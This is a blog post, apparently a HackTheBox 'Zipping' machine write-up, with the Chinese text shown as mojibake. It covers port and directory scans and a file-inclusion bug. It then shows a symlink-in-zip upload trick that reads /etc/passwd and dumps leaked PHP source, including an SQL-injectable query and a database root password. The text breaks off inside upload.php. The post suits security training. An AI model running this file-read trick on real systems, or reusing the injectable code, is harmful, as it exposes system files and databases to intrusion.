<!DOCTYPE html><html lang="zh-CN" id="theme-light-mode"><head><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><meta name="author" content="zIxyd"><title>Zipping(HTB) Â· zIxyd's Blog</title><meta name="description" content="ä¿¡æ¯æœé›†nmap12345sudo nmap -p- -sT -min-rate 3000 10.10.11.229PORT   STATE SERVICE22/tcp open  ssh80/tcp open  http



dirsearch1234dirsearch -u http://10"><meta name="keywords" content="Blog,åšå®¢,Hexo"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="renderer" content="webkit"><link rel="shortcut icon" type="image/x-icon" href="/images/logo.png"><link rel="stylesheet" href="/css/style.css"><link rel="stylesheet" href="/css/blog_basic.css"><link rel="stylesheet" href="/css/font-awesome.min.css"><link rel="stylesheet" href="/css/insight.css"><link rel="stylesheet" href="/css/search.css"><link rel="alternate" type="application/atom+xml" title="ATOM 1.0" href="/atom.xml"><script src="/js/jquery.js"></script><meta name="generator" content="Hexo 6.3.0"></head><body><div class="page-top animated fadeInDown"><div class="nav"><li> <a href="/">Home</a></li><li> <a href="/archives">Archives</a></li><li> <a href="/tags">Tags</a></li><li> <a href="/about">About</a></li></div><div class="information"><div class="nav_right_btn"><li><a class="fa fa-chevron-left" onclick="window.history.go(-1)"> </a></li><li><a class="fa fa-search" onclick="openWindow();"></a></li><li><a class="fa fa-sun-o" onclick="darkLightToggle();"></a></li></div><div class="avatar"></div></div></div><div class="sidebar animated fadeInDown"><div class="sidebar-top"><div class="logo-title"><div class="title"><img src="/images/logo.png" style="width:220px;" alt="favicon"><h3 title=""><a href="/">zIxyd's Blog</a></h3><div class="description"><p>å­˜æ”¾ä¸ªäººå­¦ä¹ ç¬”è®°çš„å°çªï¼Œæ¬¢è¿äº¤æµ</p></div></div><ul class="social-links"><li><a target="_blank" rel="noopener" href="https://github.com/zIxyd"><i class="fa fa-github"></i></a></li><li><a href="mailto:2972914692@qq.comm"><i class="fa fa-envelope"></i></a></li><li><a target="_blank" rel="noopener" href="https://res.abeim.cn/api-qq?qq=2972914692"><i class="fa fa-qq"></i></a></li></ul></div></div><div class="footer"><div class="p"> <span> å…¨ç«™CC-BY-SA-3.0 </span><i class="fa fa-star"></i><span> zIxyd</span></div><div class="by_farbox"><span>Powered by </span><a href="https://hexo.io/zh-cn/" target="_blank">Hexo </a><span> & </span><a href="https://github.com/Lhcfl/hexo-theme-anatolo" target="_blank">Anatolo </a></div><div class="beian"></div></div></div><div class="main"><div class="autopagerize_page_element"><div class="content"><div class="post-page"><div class="post animated fadeInDown"><div class="post-title"><h3><a>Zipping(HTB)</a></h3></div><div class="post-content"><p><h3 id="ä¿¡æ¯æœé›†"><a href="#ä¿¡æ¯æœé›†" class="headerlink" title="ä¿¡æ¯æœé›†"></a>ä¿¡æ¯æœé›†</h3><h4 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -p- -sT -min-rate 3000 10.10.11.229</span><br><span class="line"></span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">22/tcp open  ssh</span><br><span class="line">80/tcp open  http</span><br></pre></td></tr></table></figure>



<h4 id="dirsearch"><a href="#dirsearch" class="headerlink" title="dirsearch"></a>dirsearch</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u http://10.10.11.229/  </span><br><span class="line"></span><br><span class="line">[09:38:37] 301 -  311B  - /shop  -&gt;  http://10.10.11.229/shop/              </span><br><span class="line">[09:38:46] 200 -    5KB - /upload.php    </span><br></pre></td></tr></table></figure>





<h3 id="æ–‡ä»¶åŒ…å«"><a href="#æ–‡ä»¶åŒ…å«" class="headerlink" title="æ–‡ä»¶åŒ…å«"></a>æ–‡ä»¶åŒ…å«</h3><p><img src="https://cdn.jsdelivr.net/gh/zIxyd/image@main/ctfshow/%E8%81%94%E6%83%B3%E6%88%AA%E5%9B%BE_20231213094604.png"></p>
<p><img src="https://cdn.jsdelivr.net/gh/zIxyd/image@main/ctfshow/%E8%81%94%E6%83%B3%E6%88%AA%E5%9B%BE_20231213094521.png"></p>
<p><img src="https://cdn.jsdelivr.net/gh/zIxyd/image@main/ctfshow/image-20231213094840517.png"></p>
<p><code>/shop</code>å­˜åœ¨æ–‡ä»¶åŒ…å«æ¼æ´(åªèƒ½åŒ…å«php)ï¼ŒçŒœæµ‹æºç æ˜¯<code>$page.&quot;php&quot;</code>ä¹‹ç±»çš„</p>
<h3 id="ä»»æ„æ–‡ä»¶è¯»å–"><a href="#ä»»æ„æ–‡ä»¶è¯»å–" class="headerlink" title="ä»»æ„æ–‡ä»¶è¯»å–"></a>ä»»æ„æ–‡ä»¶è¯»å–</h3><p><img src="https://cdn.jsdelivr.net/gh/zIxyd/image@main/ctfshow/%E8%81%94%E6%83%B3%E6%88%AA%E5%9B%BE_20231213094959.png"></p>
<p><code>/upload.php</code>å­˜åœ¨ä»»æ„æ–‡ä»¶è¯»å–ï¼›ä¸Šä¼ å•ä¸ªä»¥pdfä¸ºåç¼€å‹ç¼©çš„zipæ–‡ä»¶ï¼›å¯ä»¥ç”¨è½¯è¿æ¥è¯»å–ä»»æ„æ–‡ä»¶ï¼›</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ln -s /etc/passwd pass.pdf</span><br><span class="line"></span><br><span class="line">ls -l pass.pdf</span><br><span class="line">lrwxrwxrwx 1 kali kali 11 12æœˆ13æ—¥ 09:52 pass.pdf -&gt; /etc/passwd</span><br><span class="line"></span><br><span class="line">zip --symlinks pass.zip pass.pdf </span><br></pre></td></tr></table></figure>

<p>zipå‘½ä»¤ä¸­çš„<code>--symlinks</code>é€‰é¡¹ç”¨äºæŒ‡ç¤ºzipå‘½ä»¤åœ¨åˆ›å»ºå­˜æ¡£æ—¶å¦‚ä½•å¤„ç†ç¬¦å·é“¾æ¥ã€‚å¦‚æœä½¿ç”¨äº†â€“symlinksé€‰é¡¹ï¼Œzipå‘½ä»¤å°†ä¼šå­˜å‚¨ç¬¦å·é“¾æ¥æœ¬èº«ï¼Œè€Œä¸æ˜¯ç¬¦å·é“¾æ¥æ‰€æŒ‡å‘çš„æ–‡ä»¶ã€‚è¿™æ„å‘³ç€è§£å‹ç¼©å­˜æ¡£åï¼Œç¬¦å·é“¾æ¥å°†ä¼šä¿ç•™å…¶é“¾æ¥å…³ç³»ï¼Œè€Œä¸æ˜¯è¢«è§£å‹æˆå®é™…çš„æ–‡ä»¶ã€‚</p>
<p>ä¸Šä¼ pass.zipæ–‡ä»¶ï¼Œç”¨bpæŠ“åŒ…å°±å¯ä»¥è¯»å–åˆ°<code>/etc/passwd</code>ï¼›ä¾æ¬¡è¯»å–<code>shop/index.php</code>,<code>/shop/cat.php</code>ç­‰æ–‡ä»¶</p>
<p><img src="https://cdn.jsdelivr.net/gh/zIxyd/image@main/ctfshow/%E8%81%94%E6%83%B3%E6%88%AA%E5%9B%BE_20231213095903.png"></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#/var/www/html/shop/index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="comment">// Include functions and connect to the database using PDO MySQL</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;functions.php&#x27;</span>;</span><br><span class="line"><span class="variable">$pdo</span> = <span class="title function_ invoke__">pdo_connect_mysql</span>();</span><br><span class="line"><span class="comment">// Page is set to home (home.php) by default, so when the visitor visits, that will be the page they see.</span></span><br><span class="line"><span class="variable">$page</span> = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">file_exists</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>] . <span class="string">&#x27;.php&#x27;</span>) ? <span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>] : <span class="string">&#x27;home&#x27;</span>;</span><br><span class="line"><span class="comment">// Include and show the requested page</span></span><br><span class="line"><span class="keyword">include</span> <span class="variable">$page</span> . <span class="string">&#x27;.php&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#/var/www/html/shop/cat.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// If the user clicked the add to cart button on the product page we can check for the form data</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;product_id&#x27;</span>], <span class="variable">$_POST</span>[<span class="string">&#x27;quantity&#x27;</span>])) &#123;</span><br><span class="line">    <span class="comment">// Set the post variables so we easily identify them, also make sure they are integer</span></span><br><span class="line">    <span class="variable">$product_id</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;product_id&#x27;</span>];</span><br><span class="line">    <span class="variable">$quantity</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;quantity&#x27;</span>];</span><br><span class="line">    <span class="comment">// Filtering user input for letters or special characters</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/^.*[A-Za-z!#$%^&amp;*()\-_=+&#123;&#125;\[\]\\|;:&#x27;\&quot;,.&lt;&gt;\/?]|[^0-9]$/&quot;</span>, <span class="variable">$product_id</span>, <span class="variable">$match</span>) || <span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/^.*[A-Za-z!#$%^&amp;*()\-_=+&#123;&#125;[\]\\|;:&#x27;\&quot;,.&lt;&gt;\/?]/i&quot;</span>, <span class="variable">$quantity</span>, <span class="variable">$match</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Construct the SQL statement with a vulnerable parameter</span></span><br><span class="line">        <span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM products WHERE id = &#x27;&quot;</span> . <span class="variable">$_POST</span>[<span class="string">&#x27;product_id&#x27;</span>] . <span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line">        <span class="comment">// Execute the SQL statement without any sanitization or parameter binding</span></span><br><span class="line">        <span class="variable">$product</span> = <span class="variable">$pdo</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>)-&gt;<span class="title function_ invoke__">fetch</span>(PDO::<span class="variable constant_">FETCH_ASSOC</span>);</span><br><span class="line">        <span class="comment">// Check if the product exists (array is not empty)</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$product</span> &amp;&amp; <span class="variable">$quantity</span> &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="comment">// Product exists in database, now we can create/update the session variable for the cart</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;cart&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">is_array</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;cart&#x27;</span>])) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="title function_ invoke__">array_key_exists</span>(<span class="variable">$product_id</span>, <span class="variable">$_SESSION</span>[<span class="string">&#x27;cart&#x27;</span>])) &#123;</span><br><span class="line">                    <span class="comment">// Product exists in cart so just update the quanity</span></span><br><span class="line">                    <span class="variable">$_SESSION</span>[<span class="string">&#x27;cart&#x27;</span>][<span class="variable">$product_id</span>] += <span class="variable">$quantity</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="comment">// Product is not in cart so add it</span></span><br><span class="line">                    <span class="variable">$_SESSION</span>[<span class="string">&#x27;cart&#x27;</span>][<span class="variable">$product_id</span>] = <span class="variable">$quantity</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">// There are no products in cart, this will add the first product to cart</span></span><br><span class="line">                <span class="variable">$_SESSION</span>[<span class="string">&#x27;cart&#x27;</span>] = <span class="keyword">array</span>(<span class="variable">$product_id</span> =&gt; <span class="variable">$quantity</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// Prevent form resubmission...</span></span><br><span class="line">        <span class="title function_ invoke__">header</span>(<span class="string">&#x27;location: index.php?page=cart&#x27;</span>);</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Remove product from cart, check for the URL param &quot;remove&quot;, this is the product id, make sure it&#x27;s a number and check if it&#x27;s in the cart</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;remove&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;remove&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;cart&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;cart&#x27;</span>][<span class="variable">$_GET</span>[<span class="string">&#x27;remove&#x27;</span>]])) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Remove the product from the shopping cart</span></span><br><span class="line">    <span class="keyword">unset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;cart&#x27;</span>][<span class="variable">$_GET</span>[<span class="string">&#x27;remove&#x27;</span>]]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Update product quantities in cart if the user clicks the &quot;Update&quot; button on the shopping cart page</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;update&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;cart&#x27;</span>])) &#123;</span><br><span class="line">    <span class="comment">// Loop through the post data so we can update the quantities for every product in cart</span></span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$k</span> =&gt; <span class="variable">$v</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$k</span>, <span class="string">&#x27;quantity&#x27;</span>) !== <span class="literal">false</span> &amp;&amp; <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v</span>)) &#123;</span><br><span class="line">            <span class="variable">$id</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;quantity-&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$k</span>);</span><br><span class="line">            <span class="variable">$quantity</span> = (<span class="keyword">int</span>)<span class="variable">$v</span>;</span><br><span class="line">            <span class="comment">// Always do checks and validation</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$id</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;cart&#x27;</span>][<span class="variable">$id</span>]) &amp;&amp; <span class="variable">$quantity</span> &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="comment">// Update new quantity</span></span><br><span class="line">                <span class="variable">$_SESSION</span>[<span class="string">&#x27;cart&#x27;</span>][<span class="variable">$id</span>] = <span class="variable">$quantity</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// Prevent form resubmission...</span></span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;location: index.php?page=cart&#x27;</span>);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Send the user to the place order page if they click the Place Order button, also the cart should not be empty</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;placeorder&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;cart&#x27;</span>]) &amp;&amp; !<span class="keyword">empty</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;cart&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: index.php?page=placeorder&#x27;</span>);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;clear&#x27;</span>])) &#123;</span><br><span class="line">	<span class="keyword">unset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;cart&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Check the session variable for products in cart</span></span><br><span class="line"><span class="variable">$products_in_cart</span> = <span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;cart&#x27;</span>]) ? <span class="variable">$_SESSION</span>[<span class="string">&#x27;cart&#x27;</span>] : <span class="keyword">array</span>();</span><br><span class="line"><span class="variable">$products</span> = <span class="keyword">array</span>();</span><br><span class="line"><span class="variable">$subtotal</span> = <span class="number">0.00</span>;</span><br><span class="line"><span class="comment">// If there are products in cart</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$products_in_cart</span>) &#123;</span><br><span class="line">    <span class="comment">// There are products in the cart so we need to select those products from the database</span></span><br><span class="line">    <span class="comment">// Products in cart array to question mark string array, we need the SQL statement to include IN (?,?,?,...etc)</span></span><br><span class="line">    <span class="variable">$array_to_question_marks</span> = <span class="title function_ invoke__">implode</span>(<span class="string">&#x27;,&#x27;</span>, <span class="title function_ invoke__">array_fill</span>(<span class="number">0</span>, <span class="title function_ invoke__">count</span>(<span class="variable">$products_in_cart</span>), <span class="string">&#x27;?&#x27;</span>));</span><br><span class="line">    <span class="variable">$stmt</span> = <span class="variable">$pdo</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&#x27;SELECT * FROM products WHERE id IN (&#x27;</span> . <span class="variable">$array_to_question_marks</span> . <span class="string">&#x27;)&#x27;</span>);</span><br><span class="line">    <span class="comment">// We only need the array keys, not the values, the keys are the id&#x27;s of the products</span></span><br><span class="line">    <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>(<span class="title function_ invoke__">array_keys</span>(<span class="variable">$products_in_cart</span>));</span><br><span class="line">    <span class="comment">// Fetch the products from the database and return the result as an Array</span></span><br><span class="line">    <span class="variable">$products</span> = <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">fetchAll</span>(PDO::<span class="variable constant_">FETCH_ASSOC</span>);</span><br><span class="line">    <span class="comment">// Calculate the subtotal</span></span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$products</span> <span class="keyword">as</span> <span class="variable">$product</span>) &#123;</span><br><span class="line">        <span class="variable">$subtotal</span> += (<span class="keyword">float</span>)<span class="variable">$product</span>[<span class="string">&#x27;price&#x27;</span>] * (<span class="keyword">int</span>)<span class="variable">$products_in_cart</span>[<span class="variable">$product</span>[<span class="string">&#x27;id&#x27;</span>]];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">##/var/www/html/shop/products.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// The amounts of products to show on each page</span></span><br><span class="line"><span class="variable">$num_products_on_each_page</span> = <span class="number">4</span>;</span><br><span class="line"><span class="comment">// The current page - in the URL, will appear as index.php?page=products&amp;p=1, index.php?page=products&amp;p=2, etc...</span></span><br><span class="line"><span class="variable">$current_page</span> = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;p&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;p&#x27;</span>]) ? (<span class="keyword">int</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;p&#x27;</span>] : <span class="number">1</span>;</span><br><span class="line"><span class="comment">// Select products ordered by the date added</span></span><br><span class="line"><span class="variable">$stmt</span> = <span class="variable">$pdo</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&#x27;SELECT * FROM products ORDER BY date_added DESC LIMIT ?,?&#x27;</span>);</span><br><span class="line"><span class="comment">// bindValue will allow us to use an integer in the SQL statement, which we need to use for the LIMIT clause</span></span><br><span class="line"><span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bindValue</span>(<span class="number">1</span>, (<span class="variable">$current_page</span> - <span class="number">1</span>) * <span class="variable">$num_products_on_each_page</span>, PDO::<span class="variable constant_">PARAM_INT</span>);</span><br><span class="line"><span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bindValue</span>(<span class="number">2</span>, <span class="variable">$num_products_on_each_page</span>, PDO::<span class="variable constant_">PARAM_INT</span>);</span><br><span class="line"><span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line"><span class="comment">// Fetch the products from the database and return the result as an Array</span></span><br><span class="line"><span class="variable">$products</span> = <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">fetchAll</span>(PDO::<span class="variable constant_">FETCH_ASSOC</span>);</span><br><span class="line"><span class="comment">// Get the total number of products</span></span><br><span class="line"><span class="variable">$total_products</span> = <span class="variable">$pdo</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&#x27;SELECT * FROM products&#x27;</span>)-&gt;<span class="title function_ invoke__">rowCount</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#/var/www/html/functions.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">pdo_connect_mysql</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="comment">// Update the details below with your MySQL details</span></span><br><span class="line">    <span class="variable">$DATABASE_HOST</span> = <span class="string">&#x27;localhost&#x27;</span>;</span><br><span class="line">    <span class="variable">$DATABASE_USER</span> = <span class="string">&#x27;root&#x27;</span>;</span><br><span class="line">    <span class="variable">$DATABASE_PASS</span> = <span class="string">&#x27;MySQL_P@ssw0rd!&#x27;</span>;</span><br><span class="line">    <span class="variable">$DATABASE_NAME</span> = <span class="string">&#x27;zipping&#x27;</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">    	<span class="keyword">return</span> <span class="keyword">new</span> <span class="title function_ invoke__">PDO</span>(<span class="string">&#x27;mysql:host=&#x27;</span> . <span class="variable">$DATABASE_HOST</span> . <span class="string">&#x27;;dbname=&#x27;</span> . <span class="variable">$DATABASE_NAME</span> . <span class="string">&#x27;;charset=utf8&#x27;</span>, <span class="variable">$DATABASE_USER</span>, <span class="variable">$DATABASE_PASS</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (PDOException <span class="variable">$exception</span>) &#123;</span><br><span class="line">    	<span class="comment">// If there is an error with the connection, stop the script and display the error.</span></span><br><span class="line">    	<span class="keyword">exit</span>(<span class="string">&#x27;Failed to connect to database!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Template header, feel free to customize this</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">template_header</span>(<span class="params"><span class="variable">$title</span></span>) </span>&#123;</span><br><span class="line"><span class="variable">$num_items_in_cart</span> = <span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;cart&#x27;</span>]) ? <span class="title function_ invoke__">count</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;cart&#x27;</span>]) : <span class="number">0</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#/var/www/html/upload.php </span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">              <span class="comment">// Get the uploaded zip file</span></span><br><span class="line">              <span class="variable">$zipFile</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;zipFile&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">              <span class="keyword">if</span> (<span class="variable">$_FILES</span>[<span class="string">&quot;zipFile&quot;</span>][<span class="string">&quot;size&quot;</span>] &gt; <span class="number">300000</span>) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span 